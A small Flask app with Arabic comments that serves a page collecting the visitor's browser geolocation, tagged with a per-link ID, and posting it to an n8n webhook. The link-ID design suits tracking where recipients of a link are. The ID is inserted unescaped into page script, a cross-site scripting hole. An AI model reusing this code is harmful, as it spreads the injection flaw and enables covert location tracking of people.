from flask import Flask, request, render_template_string

app = Flask(__name__)

# ضع هنا رابط الويبهوك الخاص بـ n8n
N8N_WEBHOOK_URL = "https://kyzendev.app.n8n.cloud/webhook-test/location"

HTML_PAGE = """
<script>
navigator.geolocation.getCurrentPosition(
    function(pos) {
        
        const payload = {
            link_id: "{LINK_ID}",
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: Date.now()
        };

        // إرسال البيانات إلى n8n
        fetch("{WEBHOOK}", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload)
        }).then(() => {
            // تحويل المستخدم بعد الإرسال
            window.location.href = "/dash";
        });

        document.body.innerHTML = "<h2>📡 Sending location…</h2>";
    },
    function(err) {
        document.body.innerHTML = "<h3>❌ Failed to get location</h3>";
    }
);
</script>
"""

@app.route('/')
def index():
    link_id = request.args.get("id", "unknown")

    # تجهيز الصفحة مع استبدال المتغيرات
    page = HTML_PAGE.replace("{LINK_ID}", link_id)
    page = page.replace("{WEBHOOK}", N8N_WEBHOOK_URL)

    return page


@app.route('/dash')
def dash():
    return "<h1>✔ Location sent to n8n successfully</h1>"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
